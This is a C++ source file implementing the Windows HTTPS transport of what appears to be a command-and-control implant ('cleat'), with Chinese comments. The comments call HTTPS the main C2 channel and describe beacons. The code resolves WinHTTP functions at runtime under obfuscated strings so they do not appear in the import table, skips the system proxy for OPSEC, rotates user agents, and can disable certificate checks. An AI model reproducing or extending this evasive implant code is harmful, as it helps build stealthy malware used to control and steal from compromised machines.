// PlatformWin_Http.cpp
#include "Core/Config/UA/UAProvider.hpp"
#include "PlatformWin_Http.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Core/Config/AgentConfig.hpp"
#include "Core/Native/Win/ApiResolver.hpp"

#include <windows.h>
#include <winhttp.h>

#include <random>
#include <string>
#include <vector>

namespace cleat {

	namespace {

		/// 对端(或被 MITM, 尤其 https_ignore_cert 场景)返回超大 body 即可耗尽内存。
		constexpr size_t kMaxResponseBytes = 32u * 1024 * 1024;

		// ---- WinHTTP 动态绑定(导入表脱敏): 全部 WinHttp* 经 ApiResolver 运行时
		// 解析, 函数名 OBF 混淆 —— 导入表不再出现 WinHttpOpen 等敏感 API 字样。
		// : HTTPS 是主要 C2 通道, WinHttpOpen 静态链接是最扎眼特征。
		struct WinHttpApi {
			using OpenFn = HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
			using SetOptionFn = BOOL(WINAPI*)(HINTERNET, DWORD, LPVOID, DWORD);
			using CloseFn = BOOL(WINAPI*)(HINTERNET);
			using CrackUrlFn = BOOL(WINAPI*)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
			using ConnectFn = HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
			using OpenRequestFn = HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR,
				LPCWSTR, LPCWSTR*, DWORD);
			using SetTimeoutsFn = BOOL(WINAPI*)(HINTERNET, int, int, int, int);
			using SendRequestFn = BOOL(WINAPI*)(HINTERNET, LPCWSTR, DWORD, LPVOID,
				DWORD, DWORD, DWORD_PTR);
			using WriteDataFn = BOOL(WINAPI*)(HINTERNET, LPCVOID, DWORD, LPDWORD);
			using ReceiveResponseFn = BOOL(WINAPI*)(HINTERNET, LPVOID);
			using QueryHeadersFn = BOOL(WINAPI*)(HINTERNET, DWORD, LPCWSTR, LPVOID,
				LPDWORD, LPDWORD);
			using ReadDataFn = BOOL(WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD);

			OpenFn Open = nullptr;
			SetOptionFn SetOption = nullptr;
			CloseFn Close = nullptr;
			CrackUrlFn CrackUrl = nullptr;
			ConnectFn Connect = nullptr;
			OpenRequestFn OpenRequest = nullptr;
			SetTimeoutsFn SetTimeouts = nullptr;
			SendRequestFn SendRequest = nullptr;
			WriteDataFn WriteData = nullptr;
			ReceiveResponseFn ReceiveResponse = nullptr;
			QueryHeadersFn QueryHeaders = nullptr;
			ReadDataFn ReadData = nullptr;

			bool Init() {
				const std::string mod = OBF_STR("winhttp.dll");
				Open = ApiResolver::Proc<OpenFn>(mod, OBF_STR("WinHttpOpen"));
				SetOption = ApiResolver::Proc<SetOptionFn>(mod, OBF_STR("WinHttpSetOption"));
				Close = ApiResolver::Proc<CloseFn>(mod, OBF_STR("WinHttpCloseHandle"));
				CrackUrl = ApiResolver::Proc<CrackUrlFn>(mod, OBF_STR("WinHttpCrackUrl"));
				Connect = ApiResolver::Proc<ConnectFn>(mod, OBF_STR("WinHttpConnect"));
				OpenRequest = ApiResolver::Proc<OpenRequestFn>(mod, OBF_STR("WinHttpOpenRequest"));
				SetTimeouts = ApiResolver::Proc<SetTimeoutsFn>(mod, OBF_STR("WinHttpSetTimeouts"));
				SendRequest = ApiResolver::Proc<SendRequestFn>(mod, OBF_STR("WinHttpSendRequest"));
				WriteData = ApiResolver::Proc<WriteDataFn>(mod, OBF_STR("WinHttpWriteData"));
				ReceiveResponse = ApiResolver::Proc<ReceiveResponseFn>(mod, OBF_STR("WinHttpReceiveResponse"));
				QueryHeaders = ApiResolver::Proc<QueryHeadersFn>(mod, OBF_STR("WinHttpQueryHeaders"));
				ReadData = ApiResolver::Proc<ReadDataFn>(mod, OBF_STR("WinHttpReadData"));
				return Open && SetOption && Close && CrackUrl && Connect
					&& OpenRequest && SetTimeouts && SendRequest && WriteData
					&& ReceiveResponse && QueryHeaders && ReadData;
			}
		};

		WinHttpApi& WinHttp() {
			static WinHttpApi api;
			static const bool ok = api.Init();
			(void)ok;
			return api;
		}

		// WinHTTP 全 W 函数: UTF-8 -> UTF-16(平台文件内转换, 不污染公共层)
		std::wstring Utf8ToWide(const std::string& s) {
			if (s.empty()) {
				return {};
			}
			const int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
			std::wstring w(static_cast<size_t>(n), L'\0');
			MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], n);
			w.resize(static_cast<size_t>(n - 1));   // 去掉结尾 \0
			return w;
		}

	} // namespace

	// WinHTTP 实现(同步模式): 每次 RoundTrip = WinHttpConnect/OpenRequest/发收/关闭,
	// 连接复用由 WinHTTP 会话级连接池自动维护(keep-alive)。
	class PlatformWin_Http : public IHttpOps {
	public:
		PlatformWin_Http() {
			CreateSession();
		}

		// 重建 WinHTTP 会话(UA/代理/证书选项每次全新套用)。
		// 必须支持重建: Reset(断开/重连路径)关闭旧 session 后, 若不同步重建,
		// 后续所有 RoundTrip 都会在 !session_ 处静默失败 —— HTTPS 通道永久死亡
		// (实测: 首次注册后一次降级/重连, HTTPS 回探从此全部失败, 无底层错误日志)。
		void CreateSession() {
			// UA: 统一 UAProvider(override=远程下发 http.user_agent 优先, 空=平台池随机)
			// —— 原 kUaPool 文件私有副本收敛
			std::string ua = UAProvider::Pick();
			std::wstring uaW = Utf8ToWide(ua);
			// 代理: 空=直连(默认, OPSEC 不读系统代理) | "system"=系统代理 | "host:port"=显式代理
			const std::string proxy = cleat::AgentConfig::Instance().GetHttpsProxy();
			DWORD accessType = WINHTTP_ACCESS_TYPE_NO_PROXY;
			LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;
			LPCWSTR proxyBypass = WINHTTP_NO_PROXY_BYPASS;
			std::wstring proxyW;
			if (proxy == "system") {
				accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
			}
			else if (!proxy.empty()) {
				proxyW = Utf8ToWide(proxy);
				accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
				proxyName = proxyW.c_str();
			}
			session_ = WinHttp().Open(uaW.c_str(), accessType, proxyName, proxyBypass, 0);
			if (!session_) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "PlatformWin_Http: session 创建失败 err=" << GetLastError());
			}
			// 证书校验: 默认严格; http.ignore_cert=true 时跳过(自签场景, 对齐 CS)
			if (session_ && cleat::AgentConfig::Instance().GetHttpsIgnoreCert()) {
				DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
					| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
					| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
					| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
				WinHttp().SetOption(session_, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
			}
		}

		~PlatformWin_Http() override {
			// 直接关闭, 不调 Reset(): Reset 会重建 session, 析构期重建只会泄漏句柄
			if (session_) {
				WinHttp().Close(session_);
				session_ = nullptr;
			}
		}

		bool RoundTrip(HttpMethod method, const std::string& url,
			const std::vector<uint8_t>& body, std::vector<uint8_t>& response,
			int timeout_ms,
			const std::vector<std::pair<std::string, std::string>>* headers = nullptr) override {
			if (!session_) {
				return false;
			}
			response.clear();

			// ---- 解析 URL(scheme/host/port/path) ----
			const std::wstring wurl = Utf8ToWide(url);
			URL_COMPONENTS comp{};
			comp.dwStructSize = sizeof(comp);
			std::wstring host(256, L'\0'), path(2048, L'\0');
			comp.lpszHostName = &host[0];
			comp.dwHostNameLength = 256;
			comp.lpszUrlPath = &path[0];
			comp.dwUrlPathLength = 2048;
			if (!WinHttp().CrackUrl(wurl.c_str(), 0, 0, &comp)) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::InvalidParam, "PlatformWin_Http: URL 解析失败 err=" << GetLastError()
					<< " url=" << url);
				return false;
			}
			host.resize(comp.dwHostNameLength);
			path.resize(comp.dwUrlPathLength);
			const bool secure = (comp.nScheme == INTERNET_SCHEME_HTTPS);
			if (comp.nPort == 0) {
				comp.nPort = secure ? 443 : 80;
			}

			HINTERNET connect = WinHttp().Connect(session_, host.c_str(), comp.nPort, 0);
			if (!connect) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "PlatformWin_Http: WinHttpConnect 失败 err=" << GetLastError());
				return false;
			}
			HINTERNET request = WinHttp().OpenRequest(connect,
				(method == HttpMethod::Get) ? L"GET" : L"POST",
				path.empty() ? L"/" : path.c_str(),
				nullptr, WINHTTP_NO_REFERER, nullptr,
				secure ? WINHTTP_FLAG_SECURE : 0);
			if (!request) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "PlatformWin_Http: request 创建失败 err=" << GetLastError());
				WinHttp().Close(connect);
				return false;
			}

			// 超时: 解析/连接/发送/接收 统一 timeout_ms(WinHTTP 默认 60s/无限, 必须显式设)
			WinHttp().SetTimeouts(request, timeout_ms, timeout_ms, timeout_ms, timeout_ms);
			// 禁重定向: 防 30x 把信标导向别的主机
			const DWORD policy = WINHTTP_OPTION_REDIRECT_POLICY_NEVER;
			WinHttp().SetOption(request, WINHTTP_OPTION_REDIRECT_POLICY,
				const_cast<DWORD*>(&policy), sizeof(policy));
			// 证书校验跳过(自签场景): 必须在 request 级设置 —— session 级不生效(实测 err=12175)
			if (cleat::AgentConfig::Instance().GetHttpsIgnoreCert()) {
				DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
					| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
					| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
					| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
				if (!WinHttp().SetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
					LOG_WARN("PlatformWin_Http: SECURITY_FLAGS 设置失败 err=" << GetLastError());
				}
			}

			bool ok = false;
			// 附加头(N44 4.0.1): 拼进 SendRequest 的 additional-headers(同名覆盖内建)
			std::wstring extra;
			if (headers) {
				for (const auto& h : *headers) {
					extra += Utf8ToWide(h.first) + L": " + Utf8ToWide(h.second) + L"\r\n";
				}
			}
			if (method == HttpMethod::Post) {
				const std::wstring base = L"Content-Type: application/octet-stream\r\n" + extra;
				if (WinHttp().SendRequest(request, base.c_str(), (DWORD)-1L,
					WINHTTP_NO_REQUEST_DATA, 0, static_cast<DWORD>(body.size()), 0)) {
					DWORD written = 0;
					ok = (body.empty() || WinHttp().WriteData(request, body.data(),
						static_cast<DWORD>(body.size()), &written));
				}
			}
			else {
				ok = WinHttp().SendRequest(request,
					extra.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : extra.c_str(), (DWORD)-1L,
					WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
			}

			if (ok) {
				ok = WinHttp().ReceiveResponse(request, nullptr);
			}
			if (ok) {
				DWORD status = 0;
				DWORD status_size = sizeof(status);
				if (WinHttp().QueryHeaders(request,
					WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
					WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
					WINHTTP_NO_HEADER_INDEX)) {
					if (status == HTTP_STATUS_OK) {
						// 读响应体(循环读, 兼容 Content-Length 与 chunked)
						std::vector<uint8_t> buf(64 * 1024);
						DWORD read = 0;
						bool too_large = false;
						while (WinHttp().ReadData(request, buf.data(),
							static_cast<DWORD>(buf.size()), &read) && read > 0) {
							// 不给超大 body 撑爆进程内存的机会。
							if (response.size() + read > kMaxResponseBytes) {
								CLEAT_LOGE(ErrDom::Net, ErrCode::ResourceExhausted, "PlatformWin_Http: 响应体超限("
									<< (response.size() + read) << "B > "
									<< kMaxResponseBytes << "B), 丢弃 url=" << url);
								too_large = true;
								break;
							}
							response.insert(response.end(), buf.begin(), buf.begin() + read);
							read = 0;
						}
						if (too_large) {
							response.clear();
							ok = false;
						}
						else {
							ok = true;   // 空 body 也是合法的"无数据"响应
						}
					}
					else {
						LOG_WARN("PlatformWin_Http: 非 200 响应 status=" << status << " url=" << url);
						ok = false;
					}
				}
				else {
					LOG_WARN("PlatformWin_Http: 状态码查询失败 err=" << GetLastError());
					ok = false;
				}
			}
			else {
				LOG_WARN("PlatformWin_Http: 事务失败 err=" << GetLastError() << " url=" << url);
			}

			WinHttp().Close(request);
			WinHttp().Close(connect);
			return ok;
		}

		void Reset() override {
			if (session_) {
				WinHttp().Close(session_);
				session_ = nullptr;
			}
			// 立即重建: 断开后下次 RoundTrip/探活必须可用(实测缺陷: 只关不建,
			// 一次 Disconnect 后 HTTPS 通道永久静默失败, 无任何错误日志)。
			CreateSession();
		}

	private:
		HINTERNET session_ = nullptr;
	};

	std::unique_ptr<IHttpOps> CreateHttpOps() {
		return std::make_unique<PlatformWin_Http>();
	}

} // namespace cleat
